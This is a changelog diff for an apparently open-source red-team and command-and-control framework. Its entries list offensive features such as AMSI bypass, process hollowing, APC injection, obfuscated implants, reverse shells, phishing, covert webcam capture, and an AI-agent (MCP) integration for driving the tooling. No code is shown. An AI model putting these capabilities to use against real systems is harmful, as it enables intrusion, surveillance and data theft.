+  *   * feat(feat): lazyown finally has soul \n\n Version: release/0.2.80 \n\n it's a live xD naa, it's a jocke but has agetic cappabillities now \n\n Modified file(s):\n- README.md - docs/README.html - skills/lazyown.md - skills/lazyown_mcp.py - static/security_dashboard.png\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Wed Mar 18 23:27:55 2026 -0300 \n\n Hora: 1773887275
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): the mcp can now anotate the succes or failure and the clasification of commands, so the sessions db can feed deeplearning models to improve or ai models \n\n Version: release/0.2.79 \n\n with love \n\n Modified file(s):\n- README.md - docs/README.html - skills/lazyown_mcp.py\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Tue Mar 17 23:07:52 2026 -0300 \n\n Hora: 1773799672
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): a little changes in mcp \n\n Version: release/0.2.78 \n\n with love \n\n Modified file(s):\n- README.md - docs/README.html - skills/lazyown_mcp.py - skills/mcp_restart.sh\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Tue Mar 17 18:58:51 2026 -0300 \n\n Hora: 1773784731
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): some love to mcp \n\n Version: release/0.2.77 \n\n  \n\n Modified file(s):\n- README.md - docs/README.html - skills/lazyown_mcp.py - skills/mcp_restart.sh - static/security_dashboard.png\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Tue Mar 17 17:00:07 2026 -0300 \n\n Hora: 1773777607
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): new utils into mcp \n\n Version: release/0.2.76 \n\n  \n\n Modified file(s):\n- README.md - docs/README.html - payload.json - skills/heartbeat.py - skills/lazyown.md - skills/lazyown_mcp.py\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Tue Mar 17 01:22:38 2026 -0300 \n\n Hora: 1773721358
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): readme \n\n Version: release/0.2.75 \n\n :D \n\n Modified file(s):\n- README.md - docs/README.html\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Tue Mar 17 01:20:56 2026 -0300 \n\n Hora: 1773721256
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): readme \n\n Version: release/0.2.75 \n\n :D \n\n Modified file(s):\n- README.md - docs/README.html\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Tue Mar 17 01:19:55 2026 -0300 \n\n Hora: 1773721195
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): new readme \n\n Version: release/0.2.75 \n\n :D \n\n Modified file(s):\n- README.md - docs/README.html - skills/README.md\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Tue Mar 17 01:04:09 2026 -0300 \n\n Hora: 1773720249
+
+
+### Otros
+
+### Otros
+
+  *   * Merge pull request #123 from grisuno/grisuno-patch-1
+
+
+### Otros
+
+### Otros
+
+  *   * Add LazyOwn MCP integration details to README
+
+
+### Otros
+
+### Otros
+
+  *   * Update README.md
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): new full mcp to interact with claude code with independent agents flow \n\n Version: release/0.2.75 \n\n with love has been a long time \n\n Modified file(s):\n- README.md - docs/README.html - payload.json\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Mar 16 23:43:48 2026 -0300 \n\n Hora: 1773715428
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): new feature to create new features :P \n\n Version: release/0.2.75 \n\n using claud code and skills to using their mcp to create lazyaddons \n\n Modified file(s):\n- README.md - docs/README.html\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Mar 16 23:42:36 2026 -0300 \n\n Hora: 1773715356
+
+
+### Otros
+
+### Otros
+
+  *   * mcp server to claude code like an apt xD now claud code can create new lazyaddons
+
+
+### Otros
+
+### Otros
+
+  *   * mcp server to claude code like an apt xD now claud code can create new lazyaddons
+
+
+### Otros
+
+### Otros
+
+  *   * mcp server to claude code like an apt xD
+
+
+### Otros
+
+### Otros
+
+  *   * mcp server to claude code like an apt xD
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): new agent LazyOwn it's very dumb now but we work on it. \n\n Version: release/0.2.74 \n\n new agent and some magics more. \n\n Modified file(s):\n- README.md - docs/README.html\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sat Oct 25 14:34:19 2025 -0300 \n\n Hora: 1761413659
+
+
+### Correcciones urgentes
+
+### Otros
+
+  *   * hotfix():  \n\n Version: release/0.2.68 \n\n  \n\n Modified file(s):\n- README.md - docs/README.html - payload.json - sessions/phishing/campaigns/short_urls.json\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sun Oct 12 01:30:04 2025 -0300 \n\n Hora: 1760243404
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat():  \n\n Version: release/0.2.67 \n\n  \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sun Oct 12 00:53:57 2025 -0300 \n\n Hora: 1760241237
+
+
+### Correcciones urgentes
+
+### Otros
+
+  *   * hotfix(install, key) some bug fixing and testing new keys to deploy
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): new commands, new bofs, newbug fixing, etc \n\n Version: release/0.2.64 \n\n with love \n\n Modified file(s):\n- README.md - UTILS.md - docs/README.html - docs/UTILS.html\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Fri Oct 3 03:24:41 2025 -0300 \n\n Hora: 1759472681
+
+
+### Otros
+
+### Otros
+
+  *   * Merge branch 'main' of https://github.com/grisuno/LazyOwn
+
+
+### Otros
+
+### Otros
+
+  *   * more love to new beacon in https://github.com/grisuno/beacon, new commands LazyAddons, some bug fixing, now you can pass more than one commands in lazycommnds of lazyaddons comma separated
+
+
+### Otros
+
+### Otros
+
+  *   * Merge pull request #119 from grisuno/grisuno-patch-1
+
+
+### Otros
+
+### Otros
+
+  *   * Update README.md
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): some love to the beacon, new bofs, bug fixing, new module of telemetry not invasive \n\n Version: release/0.2.63 \n\n check our youtube sorts https://www.youtube.com/shorts/A23o35TXVkg \n\n Modified file(s):\n- README.md - docs/README.html\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Wed Sep 24 07:36:16 2025 -0300 \n\n Hora: 1758710176
+
+
+### Otros
+
+### Otros
+
+  *   * more love to new beacon, a little telemetry not invasive in module tel, some bug fixing
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): new bofs, new commands, new loader, and much much more \n\n Version: release/0.2.62 \n\n new look \n\n Modified file(s):\n- README.md - UTILS.md - docs/README.html - docs/UTILS.html\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Sep 22 07:20:19 2025 -0300 \n\n Hora: 1758536419
+
+
+### Otros
+
+### Otros
+
+  *   * more love to new beacon, much more bofs, new loader, new gui, new command aes_pe to encript a exe with aes, to use in LazyLoader to load for example Black Basalt Beacon
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(test): new black basalt beacon, bof coff execution in memory in windows new beacon experimental, new commands and, some bug fix \n\n Version: release/0.2.61 \n\n with love \n\n Modified file(s):\n- README.md - docs/README.html\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sat Sep 13 08:26:57 2025 -0300 \n\n Hora: 1757762817
+
+
+### Otros
+
+### Otros
+
+  *   * more love to new beacon, now with bof in memory from an url, new Windows escalate privileges with a self-made exploit, and now you can add alias with add2find and addalias, enjoy
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): some love in the beacon, bug fixing, better gui, and much more \n\n Version: release/0.2.60 \n\n with love \n\n Modified file(s):\n- README.md - docs/README.html\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Sep 8 08:13:11 2025 -0300 \n\n Hora: 1757329991
+
+
+### Otros
+
+### Otros
+
+  *   * more love to new beacon, some love in the cli, and better gui, and some litte commands like cc beef_payload and new find instance to the beef payload
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): new gui blackbasatl, new beacon, with load_modules from memory and one module a simple rev shell, hellsgate in inyection of new black basalt beacon bbb, new alias \n\n Version: release/0.2.59 \n\n  \n\n Modified file(s):\n- README.md - UTILS.md - docs/README.html - docs/UTILS.html\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sat Sep 6 11:06:08 2025 -0400 \n\n Hora: 1757171168
+
+
+### Otros
+
+### Otros
+
+  *   * new windows beacon Stealthy and Lightweight CODENAME BlackBasalt, new gui condename BlackBasalt, new ML model to detect bad commands, integrated in LazyOwnBT, stub more stealthy, and new aliases defined by user without touch the codebase
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): new bug fixing new plugins, and hellbird, log live to hellbird \n\n Version: release/0.2.58 \n\n fixing some cves \n\n Modified file(s):\n- README.md - docs/README.html\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Sep 1 03:26:19 2025 -0400 \n\n Hora: 1756711579
+
+
+### Otros
+
+### Otros
+
+  *   * new shellcode reverse shell custom no msfvenom, some bug fixing, fix some cve, fix bugs in lolbass commands, new test to testing implants, and the king hellbird was released.
+
+
+### Otros
+
+### Otros
+
+  *   * Merge pull request #113 from grisuno/grisuno-patch-1
+
+
+### Otros
+
+### Otros
+
+  *   * Update slack_c2_bot.py
+
+
+### Otros
+
+### Otros
+
+  *   * Update README.md
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): new lolbass, new stub more stealth, new gui code name black basalt \n\n Version: release/0.2.57 \n\n with love \n\n Modified file(s):\n- README.md - docs/README.html\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sat Aug 30 00:12:18 2025 -0400 \n\n Hora: 1756527138
+
+
+### Otros
+
+### Otros
+
+  *   * new ideas, plugins lua, stubs more stealth, installers, lolbas integration, and new gui in tkinter nombre codigo black basalt o por su comando gui
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): new stubs to windows and linux, new stub in lolbas, and some new ideas \n\n Version: release/0.2.56 \n\n with love \n\n Modified file(s):\n- README.md - docs/README.html\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sun Aug 24 19:15:19 2025 -0400 \n\n Hora: 1756077319
+
+
+### Otros
+
+### Otros
+
+  *   * Update README.md
+
+
+### Otros
+
+### Otros
+
+  *   * deleting files...
+
+
+### Otros
+
+### Otros
+
+  *   * files...
+
+
+### Otros
+
+### Otros
+
+  *   * new stub to more silent execution in fases, new plugins lolbird using lolbas and stub in lolbas
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): autocomplete in c2 \n\n Version: release/0.2.55 \n\n and some ideas \n\n Modified file(s):\n- README.md - docs/README.html\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Fri Aug 22 00:03:23 2025 -0400 \n\n Hora: 1755835403
+
+
+### Otros
+
+### Otros
+
+  *   * some new ideas auto complete in c2 commands like upload_c2 donwload_cd and issue_commad_to_c2
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): new injection technique in windows beacon \n\n Version: release/0.2.54 \n\n early bird apc injection, the soul of our proyect ebird3 \n\n Modified file(s):\n- README.md - docs/README.html\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Tue Aug 19 23:45:47 2025 -0400 \n\n Hora: 1755661547
+
+
+### Otros
+
+### Otros
+
+  *   * Update README.md
+
+
+### Otros
+
+### Otros
+
+  *   * the soul of ebird3 is now in our beacon, Long Life to Early bird APC Injctn
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): shellcode execute, amsi bypass and process hollowing varian Process Overwrite \n\n Version: release/0.2.53 \n\n in the beacon \n\n Modified file(s):\n- README.md - docs/README.html\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sat Aug 16 03:04:21 2025 -0400 \n\n Hora: 1755327861
+
+
+### Otros
+
+### Otros
+
+  *   * Merge branch 'main' of https://github.com/grisuno/LazyOwn
+
+
+### Otros
+
+### Otros
+
+  *   * new amsi bypass, exeute multiplatform shellcode from url, OverWrite Process Hollowing variant from the baecon
+
+
+### Otros
+
+### Otros
+
+  *   * new amsi bypass, exeute multiplatform shellcode from url, OverWrite Process Hollowing variant from the baecon
+
+
+### Otros
+
+### Otros
+
+  *   * Update README.md
+
+
+### Otros
+
+### Otros
+
+  *   * feature(feat): new addons and new reports and bots, new injection technique earli bird apc in pure c call ebird3 \n\n Version: release/0.2.52 \n\n with love \n\n Modified file(s):\n- README.md - docs/README.html\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Wed Aug 13 02:53:49 2025 -0400 \n\n Hora: 1755068029
+
+
+### Otros
+
+### Otros
+
+  *   * Update README.md
+
+
+### Otros
+
+### Otros
+
+  *   * new LazyAddons and some stuffs :) new github bot and reporting
+
+
+### Otros
+
+### Otros
+
+  *   * new LazyAddons and some stuffs :) new github bot and reporting
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): new addons and new addon creator and new vulnbot \n\n Version: release/0.2.51 \n\n and ia_model to iteract with the models more clean \n\n Modified file(s):\n- README.md - docs/README.html\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sun Aug 10 11:17:11 2025 -0400 \n\n Hora: 1754839031
+
+
+### Otros
+
+### Otros
+
+  *   * new LazyAddons and some stuffs :) new vuln bot and lazyaddons ia generated
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): some new addons \n\n Version: release/0.2.50 \n\n and some bug fix \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html.bak\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Fri Aug 8 08:59:50 2025 -0400 \n\n Hora: 1754657990
+
+
+### Otros
+
+### Otros
+
+  *   * new LazyAddons and some stuffs :) and bug fix
+
+
+### Otros
+
+### Otros
+
+  *   * Update README.md
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): new addons \n\n Version: release/0.2.49 \n\n and love \n\n Modified file(s):\n- README.md - UTILS.md - docs/README.html - docs/UTILS.html\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Aug 4 05:56:06 2025 -0400 \n\n Hora: 1754301366
+
+
+### Otros
+
+### Otros
+
+  *   * new LazyAddons and some stuffs :)
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): New LazyAddons cgoblin and gomulti_loader remote code execution in LazyAddons and much much more xd \n\n Version: release/0.2.48 \n\n ind love \n\n Modified file(s):\n- README.md - docs/README.html\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sat Aug 2 16:17:30 2025 -0400 \n\n Hora: 1754165850
+
+
+### Otros
+
+### Otros
+
+  *   * new LazyAddons to the family gmulti_loader and CGOblin, remote code execution from LazyAddons and much more
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): some bug fixing \n\n Version: release/0.2.47 \n\n and using gum in shell scripting \n\n Modified file(s):\n- README.md - docs/README.html\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Jul 28 01:19:41 2025 -0400 \n\n Hora: 1753679981
+
+
+### Otros
+
+### Otros
+
+  *   * usign gum in shell scripting and new custom loader to windows for msf payload in c and asm
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): new yamls and some fix \n\n Version: release/0.2.46 \n\n new template phishing route \n\n Modified file(s):\n- README.md - UTILS.md - docs/README.html\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Tue Jul 15 19:53:44 2025 -0400 \n\n Hora: 1752623624
+
+
+### Otros
+
+### Otros
+
+  *   * some ideas
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): cloud support \n\n Version: release/0.2.44 \n\n and some love \n\n Modified file(s):\n- README.md - docs/README.html\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Fri Jul 4 22:40:01 2025 -0400 \n\n Hora: 1751683201
+
+
+### Otros
+
+### Otros
+
+  *   * Merge branch 'main' of https://github.com/grisuno/LazyOwn
+
+
+### Otros
+
+### Otros
+
+  *   * some ideas and cloud support with stratus
+
+
+### Otros
+
+### Otros
+
+  *   * Update README.md
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): new addons sphinx to documentations, etc \n\n Version: release/0.2.44 \n\n  \n\n Modified file(s):\n- README.md - docs/README.html\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Wed Jun 25 19:51:06 2025 -0400 \n\n Hora: 1750895466
+
+
+### Otros
+
+### Otros
+
+  *   * sphinx to docs, new addons, and new indeas to adversaries
+
+
+### Otros
+
+### Otros
+
+  *   * sphinx to docs, new addons, and new indeas to adversaries
+
+
+### Otros
+
+### Otros
+
+  *   * sphinx to docs, new addons, and new indeas to adversaries
+
+
+### Otros
+
+### Otros
+
+  *   * Update .readthedocs.yaml
+
+
+### Otros
+
+### Otros
+
+  *   * Create .readthedocs.yaml
+
+
+### Otros
+
+### Otros
+
+  *   * Update README.md
+
+
+### Otros
+
+### Otros
+
+  *   * Update README.md
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): new ideas \n\n Version: release/0.2.44 \n\n with love \n\n Modified file(s):\n- README.md - UTILS.md - docs/README.html - docs/UTILS.html\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Fri Jun 20 01:27:41 2025 -0400 \n\n Hora: 1750397261
+
+
+### Otros
+
+### Otros
+
+  *   * some new ideas
+
+
+### Correcciones urgentes
+
+### Otros
+
+  *   * hotfix(hotfix):  \n\n Version: release/0.2.44 \n\n  \n\n Modified file(s):\n- README.md - docs/README.html\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sat Jun 14 03:02:35 2025 -0400 \n\n Hora: 1749884555
+
+
+### Correcciones urgentes
+
+### Otros
+
+  *   * hotfix(hotfix): hotfix \n\n Version: release/0.2.44 \n\n  \n\n Modified file(s):\n- README.md - docs/README.html\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Thu Jun 12 01:02:27 2025 -0400 \n\n Hora: 1749704547
+
+
+### Otros
+
+### Otros
+
+  *   * Update README.md
+
+
+### Otros
+
+### Otros
+
+  *   * hotfix
+
+
+### Otros
+
+### Otros
+
+  *   * hotfix
+
+
+### Otros
+
+### Otros
+
+  *   * Update README.md
+
+
+### Otros
+
+### Otros
+
+  *   * Update README.md
+
+
+### Otros
+
+### Otros
+
+  *   * some ideas
+
+
+### Otros
+
+### Otros
+
+  *   * bugfixing and new phishing module :D
+
+
+### Otros
+
+### Otros
+
+  *   * feature(feature): new phishing module \n\n Version: release/0.2.43 \n\n and bug fixing \n\n Modified file(s):\n- README.md - UTILS.md - docs/README.html - docs/UTILS.html\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Thu Jun 12 01:00:43 2025 -0400 \n\n Hora: 1749704443
+
+
+### Otros
+
+### Otros
+
+  *   * bugfixing and new phishing module :D
+
+
+### Otros
+
+### Otros
+
+  *   * bugfixing and new phishing module :D
+
+
+### Correcciones urgentes
+
+### Otros
+
+  *   * hotfix(hotfix): bugfixing \n\n Version: release/0.2.42 \n\n withlove \n\n Modified file(s):\n- README.md - docs/README.html\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sat Jun 7 21:27:26 2025 -0400 \n\n Hora: 1749346046
+
+
+### Otros
+
+### Otros
+
+  *   * Merge branch 'main' of https://github.com/grisuno/LazyOwn
+
+
+### Otros
+
+### Otros
+
+  *   * bugfixing
+
+
+### Otros
+
+### Otros
+
+  *   * Update README.md
+
+
+### Otros
+
+### Otros
+
+  *   * bugfixing
+
+
+### Otros
+
+### Otros
+
+  *   * bugfixing and certipy_ad new options
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): new surface attack like bloodhound and decoy malicius try to share webcam, mic and screen \n\n Version: release/0.2.41 \n\n and some others surprices \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html.bak\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sat Jun 7 05:44:36 2025 -0400 \n\n Hora: 1749289476
+
+
+### Otros
+
+### Otros
+
+  *   * Update README.md
+
+
+### Otros
+
+### Otros
+
+  *   * decoy more agresive take snapshots of screen and video of webcam and bloodhound zip surface attack
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): new image \n\n Version: release/0.2.40 \n\n new fixes \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html.bak\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Jun 2 01:28:19 2025 -0400 \n\n Hora: 1748842099
+
+
+### Otros
+
+### Otros
+
+  *   * some neww ideas
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): new beacon cappabilities documented at readme.md and some new surpices and layaddons and some bug fixing. \n\n Version: release/0.2.39 \n\n with love \n\n Modified file(s):\n- README.md - UTILS.md - docs/README.html - docs/UTILS.html - docs/index.html\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sun Jun 1 17:02:42 2025 -0400 \n\n Hora: 1748811762
+
+
+### Otros
+
+### Otros
+
+  *   * new cappabilities to the beacon documented at readme and some new surprices
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): new functionalities to discover in c2 and implant and exfiltration cap, portscanning, etc \n\n Version: release/0.2.38 \n\n with love \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - docs/index.html.bak\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon May 26 01:31:14 2025 -0400 \n\n Hora: 1748237474
+
+
+### Otros
+
+### Otros
+
+  *   * new cappabilities to the c2 to discovered the net surface and the implant can improve a network discover, portscan the discovered hosts, search for a files and exfiltrate and others
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): new offuscated implants go more maleable more undetectable, new command rev to automated get a revshell, cloudflare tunnel to get certified subdomain to the infra for free \n\n Version: release/0.2.37 \n\n host discovery cappabilities to map in the c2 more addons , newver was more easy extend the framework functionality \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - docs/index.html.bak\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Thu May 22 00:29:10 2025 -0400 \n\n Hora: 1747888150
+
+
+### Otros
+
+### Otros
+
+  *   * deleting large files ....
+
+
+### Otros
+
+### Otros
+
+  *   * New addons, implant ofuscated by garble, tunnel cloudflare, host_discover at C2 diagram show the entire network , implant more maleable, some new ideas to ia and rag or cag
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): lazyownbt y cloudflare_tunnel \n\n Version: release/0.2.36 \n\n documented at aliass command for alias customs \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - docs/index.html.bak\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sun May 18 17:36:49 2025 -0400 \n\n Hora: 1747604209
+
+
+### Otros
+
+### Otros
+
+  *   * new commadn lazyownbt for blueteams, and cloudflare tunnel to c2 over inet
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): new categoried help and others things \n\n Version: release/0.2.35 \n\n with love \n\n Modified file(s):\n- README.md - UTILS.md - docs/README.html - docs/UTILS.html - docs/index.html - docs/index.html.bak\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sun May 11 19:45:16 2025 -0400 \n\n Hora: 1747007116
+
+
+### Otros
+
+### Otros
+
+  *   * Merge pull request #90 from grisuno/grisuno-patch-1
+
+
+### Otros
+
+### Otros
+
+  *   * Update README.md
+
+
+### Otros
+
+### Otros
+
+  *   * commands categorized
+
+
+### Correcciones urgentes
+
+### Otros
+
+  *   * hotfix(hotfix): file path traversal and some othstuff \n\n Version: release/0.2.34 \n\n hotfix \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - docs/index.html.bak\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sun May 4 23:39:25 2025 -0400 \n\n Hora: 1746416365
+
+
+### Otros
+
+### Otros
+
+  *   * hotfix
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): fully tty in local shell in web cli \n\n Version: release/0.2.33 \n\n pty and xterm.js \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - docs/index.html.bak\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sun May 4 21:44:55 2025 -0400 \n\n Hora: 1746409495
+
+
+### Otros
+
+### Otros
+
+  *   * Merge branch 'main' of https://github.com/grisuno/LazyOwn
+
+
+### Otros
+
+### Otros
+
+  *   * fully tty local shell implementation in web cli
+
+
+### Nuevas características
+
+### Otros
+
